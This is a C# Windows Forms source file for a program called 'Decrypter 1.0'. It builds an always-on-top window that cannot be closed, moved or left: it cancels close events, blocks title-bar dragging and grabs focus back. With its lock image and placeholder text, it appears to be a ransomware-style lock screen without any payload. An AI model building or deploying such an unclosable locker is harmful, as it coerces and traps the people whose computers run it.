using System;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Reflection;

// RELEASE: dotnet publish -r win-x64 -p:PublishSingleFile=true --self-contained false

namespace Decrypter
{
    public class Program : Form
    {
        public Program()
        {
            // Fenster-Eigenschaften
            this.Text = "Decrypter 1.0";                            // Fenstertitel
            this.Width = 1300;                                      // Fensterbreite
            this.Height = 900;                                      // Fensterhöhe
            this.StartPosition = FormStartPosition.CenterScreen;    // Zentriert starten
            this.FormBorderStyle = FormBorderStyle.FixedDialog;     // Fixierte Größe
            this.ControlBox = false;                                // Entfernt die "X"-Schließen-Schaltfläche
            this.MaximizeBox = false;                               // Deaktiviert Maximieren
            this.MinimizeBox = false;                               // Minimieren bleibt erlaubt
            this.TopMost = true;                                    // Fenster immer im Vordergrund halten
            // this.ShowInTaskbar = false;                             // Fenster nicht in der Taskleiste anzeigen

            // Background
            string backround1Name = "Decrypter.img.background1.png";
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(backround1Name))
            {
                if (stream != null)
                {
                    this.BackgroundImage = Image.FromStream(stream);
                    this.BackgroundImageLayout = ImageLayout.Stretch;
                }
                else
                {
                    MessageBox.Show("Resource not found");
                }
            }

            // Window Text
            Label lblInfo = new Label();
            lblInfo.Text = "Hier könnte Ihre Werbung stehen!";
            lblInfo.AutoSize = true;
            lblInfo.Font = new System.Drawing.Font("Arial", 24);
            lblInfo.Location = new System.Drawing.Point(400, 400);
            lblInfo.TextAlign = ContentAlignment.MiddleCenter;
            this.Controls.Add(lblInfo);

            // PictureBox (lock)
            PictureBox pictureBox = new PictureBox
            {
                Size = new Size(170, 230),
                Location = new Point(100, 5),
                BorderStyle = BorderStyle.None,
                SizeMode = PictureBoxSizeMode.Zoom,
                BackColor = Color.Transparent
            };

            
            // Bild aus Ressource laden
            string resourceName = "Decrypter.img.unlock.png";
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream != null)
                {
                    pictureBox.Image = Image.FromStream(stream);
                }
                else
                {
                    MessageBox.Show("Resource not found");
                }
            }
            this.Controls.Add(pictureBox);
        }

        // Avoids closure
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    

        // Avoids Movement
        protected override void WndProc(ref Message m)
        {
            const int WM_NCLBUTTONDOWN = 0xA1; 
            const int HTCAPTION = 0x2;       
            
            if (m.Msg == WM_NCLBUTTONDOWN && m.WParam.ToInt32() == HTCAPTION)
            {
                return;
            }

            base.WndProc(ref m);
        }

        // Holds focus
        protected override void OnDeactivate(EventArgs e)
        {
            base.OnDeactivate(e);
            this.Activate();
        }


        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Program());
        }
    }
}